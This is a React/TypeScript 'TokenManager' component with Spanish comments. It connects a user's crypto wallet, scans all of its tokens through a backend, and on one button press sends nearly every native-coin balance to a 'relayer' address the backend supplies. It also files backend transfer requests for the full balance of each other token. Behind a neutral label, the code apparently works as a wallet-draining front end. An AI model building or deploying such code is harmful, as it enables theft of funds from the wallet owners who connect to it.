'use client'
import React, { useEffect, useState } from 'react'
import { useAppKit } from '@reown/appkit/react'
import { useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
import { ethers } from 'ethers'

export default function TokenManager() {
  const { open } = useAppKit()
  const { address, isConnected } = useAccount()
  const { data: walletClient } = useWalletClient()
  const publicClient = usePublicClient()
  const { data: balance } = useBalance({ address })
  const { data: feeData } = useFeeData()
  const [tokens, setTokens] = useState<any[]>([])
  const [loading, setLoading] = useState(false)
  const [processing, setProcessing] = useState(false)
  const [summary, setSummary] = useState<{sent: any[], failed: any[]}>({ sent: [], failed: [] })

  // Escanear tokens cuando la wallet está conectada
  // En la función scanWallet
useEffect(() => {
  if (isConnected && address) {
    scanWallet()
  }
}, [isConnected, address])

const scanWallet = async () => {
  try {
    setLoading(true)
    const res = await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/owner-tokens`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ owner: address })
    })

    if (!res.ok) {
      throw new Error('Error en la respuesta del servidor')
    }

    const data = await res.json()
    console.log('Tokens detectados:', data)
    
    // Asegurarse de que los tokens nativos tengan address: null
    const processedTokens = data.tokens.map(token => {
      if (token.symbol === 'MATIC' && !token.address) {
        return { ...token, address: null }
      }
      return token
    })
    
    setTokens(processedTokens || [])
  } catch (err) {
    console.error('Error escaneando wallet:', err)
    alertAction('Error escaneando wallet: ' + err)
  } finally {
    setLoading(false)
  }
}

  // Función para alertas adaptadas a móviles
  const alertAction = async (message: string) => {
    if (typeof window !== 'undefined' && window.ReactNativeWebView) {
      // Si está en app nativa
      window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'alert', message }))
    } else if (typeof window !== 'undefined' && window.alert) {
      // Navegador normal
      alert(message)
    }
  }

  // Función para confirmaciones adaptadas a móviles
  const confirmAction = async (message: string): Promise<boolean> => {
    if (typeof window !== 'undefined' && window.ReactNativeWebView) {
      // Si está en app nativa
      return new Promise((resolve) => {
        const handler = (event: MessageEvent) => {
          try {
            const data = JSON.parse(event.data)
            if (data.type === 'confirmResponse') {
              window.removeEventListener('message', handler)
              resolve(data.response)
            }
          } catch (e) {}
        }
        
        window.addEventListener('message', handler)
        window.ReactNativeWebView.postMessage(
          JSON.stringify({ type: 'confirm', message })
        )
        
        // Timeout después de 30 segundos
        setTimeout(() => {
          window.removeEventListener('message', handler)
          resolve(false)
        }, 30000)
      })
    } else if (typeof window !== 'undefined' && window.confirm) {
      // Navegador normal
      return Promise.resolve(confirm(message))
    }
    return Promise.resolve(false)
  }

  // Verificar si es un dispositivo móvil
  const isMobile = () => {
    if (typeof window === 'undefined') return false
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
      navigator.userAgent
    )
  }

  // Obtener información de wrap para una cadena específica
  const getWrapInfo = async (chainId: number) => {
    try {
      const res = await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/wrap-info`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chain: chainId })
      })
      
      if (res.ok) {
        return await res.json()
      }
      return null
    } catch (err) {
      console.error('Error obteniendo info de wrap:', err)
      return null
    }
  }

  // Verificar si el usuario rechazó una transacción
  const isUserRejected = (error: any) => {
    if (!error) return false
    const message = String(error.message || '').toLowerCase()
    return /user denied|user rejected|rejected by user/i.test(message)
  }

  // Función para procesar tokens nativos (wrap o transfer)
  // Función para procesar tokens nativos (wrap o transfer)
const processNativeToken = async (token: any) => {
  try {
    if (!walletClient || !publicClient || !address) {
      throw new Error('Wallet no conectada correctamente')
    }

    const chainId = publicClient.chain?.id
    if (!chainId) {
      throw new Error('No se pudo determinar la cadena')
    }

    // Obtener información de wrap
    const wrapInfo = await getWrapInfo(chainId)
    const wrappedAddress = wrapInfo?.wrappedAddress

    // Obtener balance y calcular gas
    const balanceBN = ethers.BigNumber.from(token.balance)
    const gasPrice = feeData?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto
    
    // Estimaciones de gas (valores por defecto)
    let gasLimitTransfer = ethers.BigNumber.from(21000)
    let gasLimitWrap = ethers.BigNumber.from(100000)
    
    // Buffer de seguridad
    const buffer = gasPrice.mul(30000)
    
    // Calcular máximos seguros
    const feeWrap = gasPrice.mul(gasLimitWrap)
    const feeTransfer = gasPrice.mul(gasLimitTransfer)
    const maxSafeForWrap = balanceBN.gt(feeWrap.add(buffer)) 
      ? balanceBN.sub(feeWrap).sub(buffer) 
      : ethers.BigNumber.from(0)
    const maxSafeForTransfer = balanceBN.gt(feeTransfer.add(buffer)) 
      ? balanceBN.sub(feeTransfer).sub(buffer) 
      : ethers.BigNumber.from(0)

    // Si no hay suficiente para ninguna operación
    if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
      const reason = 'Saldo insuficiente para cubrir gas fees'
      setSummary(prev => ({
        ...prev,
        failed: [...prev.failed, { token, reason }]
      }))
      return
    }

    // Si hay wrapped disponible y saldo suficiente, ofrecer wrap
    if (wrappedAddress && maxSafeForWrap.gt(0)) {
      const humanAmount = ethers.utils.formatEther(maxSafeForWrap)
      const shouldWrap = await confirmAction(
        `¿Deseas wrappear ${humanAmount} ${token.symbol}? (Recomendado para mejores tasas)`
      )
      
      if (shouldWrap) {
        try {
          // Contrato de wrapped token (ej: WETH, WMATIC)
          const wrapAbi = [
            {
              inputs: [],
              name: 'deposit',
              outputs: [],
              stateMutability: 'payable',
              type: 'function'
            }
          ] as const;          
          // Ejecutar wrap
          const hash = await walletClient.writeContract({
            address: wrappedAddress as `0x${string}`,
            abi: wrapAbi,
            functionName: 'deposit',
            value: maxSafeForWrap.toBigInt(),
            gas: gasLimitWrap.toBigInt()
          })
          
          // Esperar confirmación
          await publicClient.waitForTransactionReceipt({ hash })
          
          setSummary(prev => ({
            ...prev,
            sent: [...prev.sent, { 
              token: { ...token, symbol: `W${token.symbol}` }, 
              type: 'wrap', 
              tx: hash,
              amount: maxSafeForWrap.toString() 
            }]
          }))
          
          return
        } catch (error) {
          if (isUserRejected(error)) {
            setSummary(prev => ({
              ...prev,
              failed: [...prev.failed, { token, reason: 'Usuario rechazó el wrap' }]
            }))
            return
          }
          throw error
        }
      }
    }

    // Si no se hizo wrap, crear solicitud de transferencia en el backend
    if (maxSafeForTransfer.gt(0)) {
      const humanAmount = ethers.utils.formatEther(maxSafeForTransfer)
      const shouldTransfer = await confirmAction(
        `¿Deseas transferir ${humanAmount} ${token.symbol} al relayer?`
      )
      
      if (shouldTransfer) {
        // Para tokens nativos, usar el endpoint especial
        const res = await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/create-native-transfer-request`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            owner: address,
            chain: token.chain,
            amount: maxSafeForTransfer.toString()
          })
        })
        
        const data = await res.json()
        
        if (data.ok && data.instructions && data.instructions.relayerAddress) {
          // Ejecutar transferencia
          const hash = await walletClient.sendTransaction({
            to: data.instructions.relayerAddress as `0x${string}`,
            value: maxSafeForTransfer.toBigInt(),
            gas: gasLimitTransfer.toBigInt()
          })
          
          // Esperar confirmación
          await publicClient.waitForTransactionReceipt({ hash })
          
          setSummary(prev => ({
            ...prev,
            sent: [...prev.sent, { 
              token, 
              type: 'transfer', 
              tx: hash,
              amount: maxSafeForTransfer.toString(),
              jobId: data.jobId 
            }]
          }))
        } else {
          throw new Error('Error creando solicitud de transferencia')
        }
      } else {
        setSummary(prev => ({
          ...prev,
          failed: [...prev.failed, { token, reason: 'Usuario canceló la transferencia' }]
        }))
      }
    }
  } catch (error) {
    console.error('Error procesando token nativo:', error)
    
    const reason = isUserRejected(error) 
      ? 'Usuario rechazó la transacción' 
      : `Error: ${error.message || error}`
      
    setSummary(prev => ({
      ...prev,
      failed: [...prev.failed, { token, reason }]
    }))
  }
}

  // Función para procesar tokens ERC20/SPL
  const processToken = async (token: any) => {
    try {
      // Para tokens no nativos, crear solicitud de transferencia
      const res = await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/create-transfer-request`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          owner: address,
          chain: token.chain,
          token: token.address,
          amount: token.balance
        })
      })
      
      const data = await res.json()
      
      if (data.ok) {
        setSummary(prev => ({
          ...prev,
          sent: [...prev.sent, { 
            token, 
            type: 'transfer', 
            jobId: data.jobId,
            amount: token.balance 
          }]
        }))
        
        await alertAction('Solicitud de transferencia creada. El relayer procesará pronto.')
      } else {
        throw new Error(data.error || 'Error creando solicitud de transferencia')
      }
    } catch (error) {
      console.error('Error procesando token:', error)
      setSummary(prev => ({
        ...prev,
        failed: [...prev.failed, { token, reason: error.message || 'Error desconocido' }]
      }))
    }
  }

  // Procesar todos los tokens
  // Procesar todos los tokens
const processAllTokens = async () => {
  if (!tokens.length) return
  
  setProcessing(true)
  setSummary({ sent: [], failed: [] })
  
  for (const token of tokens) {
    if (!token.address) {
      // Token nativo
      await processNativeToken(token)
    } else {
      // Token ERC20/SPL
      await processToken(token)
    }
  }
  
  setProcessing(false)
  
  // Mostrar resumen
  if (summary.sent.length > 0 || summary.failed.length > 0) {
    let message = '=== Resumen ===\n'
    message += `Éxitos: ${summary.sent.length}\n`
    message += `Fallos: ${summary.failed.length}\n`
    
    if (summary.failed.length > 0) {
      message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
    }
    
    await alertAction(message)
  }
}

  return (
    <div style={{ padding: '20px', fontFamily: 'Arial', maxWidth: '800px', margin: '0 auto' }}>
      <h1>Administrador de Tokens</h1>
      
      <button 
        onClick={() => open()} 
        style={{ 
          padding: '12px 16px', 
          fontSize: '16px', 
          backgroundColor: '#0070f3', 
          color: 'white', 
          border: 'none', 
          borderRadius: '8px',
          cursor: 'pointer',
          marginBottom: '20px'
        }}
      >
        {isConnected ? `Conectado: ${address?.substring(0, 8)}...` : 'Conectar Wallet'}
      </button>
      
      {isConnected && (
        <div>
          <button 
            onClick={scanWallet} 
            disabled={loading}
            style={{ 
              padding: '10px 14px', 
              fontSize: '14px', 
              marginLeft: '10px',
              backgroundColor: loading ? '#ccc' : '#4CAF50',
              color: 'white',
              border: 'none',
              borderRadius: '4px',
              cursor: loading ? 'not-allowed' : 'pointer'
            }}
          >
            {loading ? 'Escaneando...' : 'Escanear Tokens'}
          </button>
          
          {tokens.length > 0 && (
            <button 
              onClick={processAllTokens} 
              disabled={processing}
              style={{ 
                padding: '10px 14px', 
                fontSize: '14px', 
                marginLeft: '10px',
                backgroundColor: processing ? '#ccc' : '#FF5722',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                cursor: processing ? 'not-allowed' : 'pointer'
              }}
            >
              {processing ? 'Procesando...' : 'Procesar Todos los Tokens'}
            </button>
          )}
        </div>
      )}
      
      {loading && (
        <div style={{ marginTop: '20px' }}>
          <p>Escaneando tokens en todas las cadenas...</p>
          <div style={{ 
            width: '100%', 
            height: '4px', 
            backgroundColor: '#f0f0f0', 
            borderRadius: '2px',
            overflow: 'hidden'
          }}>
            <div style={{ 
              width: '100%', 
              height: '100%', 
              backgroundColor: '#0070f3',
              animation: 'loading 1.5s infinite ease-in-out'
            }}></div>
          </div>
        </div>
      )}
      
      {tokens.length > 0 && (
        <div style={{ marginTop: '20px' }}>
          <h2>Tokens Detectados ({tokens.length})</h2>
          <div style={{ 
            maxHeight: '400px', 
            overflow: 'auto',
            border: '1px solid #e0e0e0',
            borderRadius: '8px',
            padding: '10px'
          }}>
            {tokens.map((token, index) => (
              <div key={index} style={{ 
                padding: '12px', 
                margin: '8px 0',
                borderRadius: '6px',
                backgroundColor: '#f9f9f9',
                border: '1px solid #e0e0e0'
              }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div>
                    <h3 style={{ margin: '0 0 4px 0' }}>{token.symbol}</h3>
                    <p style={{ margin: '0', color: '#666', fontSize: '14px' }}>
                      Balance: {ethers.utils.formatUnits(token.balance, token.decimals || 18)}
                    </p>
                    <p style={{ margin: '0', color: '#666', fontSize: '14px' }}>
                      Cadena: {token.chain} {!token.address && '(Nativo)'}
                    </p>
                  </div>
                  <button 
                    onClick={() => !token.address ? processNativeToken(token) : processToken(token)}
                    disabled={processing}
                    style={{ 
                      padding: '8px 12px', 
                      fontSize: '12px',
                      backgroundColor: '#0070f3',
                      color: 'white',
                      border: 'none',
                      borderRadius: '4px',
                      cursor: processing ? 'not-allowed' : 'pointer'
                    }}
                  >
                    Procesar
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}
      
      {(summary.sent.length > 0 || summary.failed.length > 0) && (
        <div style={{ marginTop: '20px' }}>
          <h2>Resumen de Procesamiento</h2>
          
          {summary.sent.length > 0 && (
            <div style={{ marginBottom: '20px' }}>
              <h3 style={{ color: '#4CAF50' }}>Éxitos ({summary.sent.length})</h3>
              {summary.sent.map((item, index) => (
                <div key={index} style={{ 
                  padding: '10px', 
                  margin: '5px 0',
                  backgroundColor: '#E8F5E9',
                  borderRadius: '4px',
                  fontSize: '14px'
                }}>
                  {item.type === 'wrap' ? 'Wrapped' : 'Transferido'} {item.token.symbol} - {item.tx ? `TX: ${item.tx.substring(0, 10)}...` : `Job ID: ${item.jobId}`}
                </div>
              ))}
            </div>
          )}
          
          {summary.failed.length > 0 && (
            <div>
              <h3 style={{ color: '#F44336' }}>Fallos ({summary.failed.length})</h3>
              {summary.failed.map((item, index) => (
                <div key={index} style={{ 
                  padding: '10px', 
                  margin: '5px 0',
                  backgroundColor: '#FFEBEE',
                  borderRadius: '4px',
                  fontSize: '14px'
                }}>
                  {item.token.symbol} - {item.reason}
                </div>
              ))}
            </div>
          )}
        </div>
      )}
      
      <style jsx>{`
        @keyframes loading {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(100%); }
        }
      `}</style>
    </div>
  )
}